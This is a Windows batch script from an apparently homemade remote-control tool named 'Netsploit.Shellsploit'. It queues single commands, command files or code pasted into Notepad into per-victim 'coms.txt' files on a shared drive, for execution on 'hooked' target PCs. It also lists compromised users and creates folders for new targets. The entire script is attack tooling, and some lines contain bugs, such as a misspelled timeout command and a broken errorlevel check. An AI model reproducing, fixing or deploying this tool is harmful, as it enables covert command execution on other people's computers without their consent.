@echo off
color A
cls
IF NOT EXIST Q:\DMC call SummonFolder
IF NOT EXIST Q:\DMC\ExFilaes\USR\%target% call :TargetNotFound
IF "%mode%" EQU "File" goto FileExecute
IF "%mode%" EQU "NotepadExecute" goto NotepadExecute
IF "%mode%" EQU "Command" goto CommandExecute
goto ComStruckWrong
:FileExecute
    type %optional% >Q:\DMC\ExFilaes\USR\%target%\coms.txt
        echo Code has been put up to Execution
            timeout /t 3
                Exit /b 333
:CommandExecute
    echo %optional% >Q:\DMC\ExFilaes\USR\%target%\coms.txt
        echo Code has been put up for execution
            timeout /t 3 >nul
                Exit /b 333
:NotepadExecute
    echo.>H:\Netsploit\Temps\ShellsploitTemp.txt
        Notepad.exe H:\Netsploit\Temps\ShellsploitTemp.txt
            echo Awaiting user input for execution
                pause >nul
                    type H:\Netsploit\Temps\ShellsploitTemp.txt >Q:\DMC\ExFilaes\USR\%target%\coms.txt
                        echo Code has been put up for execution
                            timeout /t 3 >nul
                                Exit /b 333


:ComStruckWrong
    cls
        echo The command you have entered has the wrong struckture the syntax of Netsploit.Shellsploit is:
            echo Netsploit.Shellsploit target (Domain User) mode (Single command="Command" Multiple commands in a File="File")
                echo when using mode "File", enter the file path after the mode and hit enter.
                    echo when using mode "NotepadExecute", paste the code into the opening file and click strg + s, then close the window and hit enter.
                        echo when using mode "Command", enter an command that should be executed on the targets PC and hit enter.
                            echo Press any key to close this Help message
                                pause >nul
                                    Exit /b 333
:TargetNotFound
    cls
        echo The entered Target has not been found in the hook Menu, this are all hooked users:
            dir Q:\DMC\ExFilaes\USR
                echo Would you like to set up an folder and execution anyway?
                    CHOICE /C YN /M "Press Y to set up folder and execution, press N to cancel"
                        IF %Errorlevel% EQU "N" Exit /b 333
                            echo setting up Folder...
                                MKDIR Q:\DMC\ExFilaes\USR\%target%
                                    echo Setting up command file...
                                        echo.>Q:\DMC\ExFilaes\USR\%target%\coms.txt
                                            echo Setup complete
                                                echo Sending user to selected execution in 3 seconds
                                                    timeout /t 3 >nul
                                                        Exit /b 333
                                                     
:SummonFolder
    xcopy H:\DMC Q:\
        echo Copyed Folder to Q:
            timout /t 2 >nul    
                Exit /b 333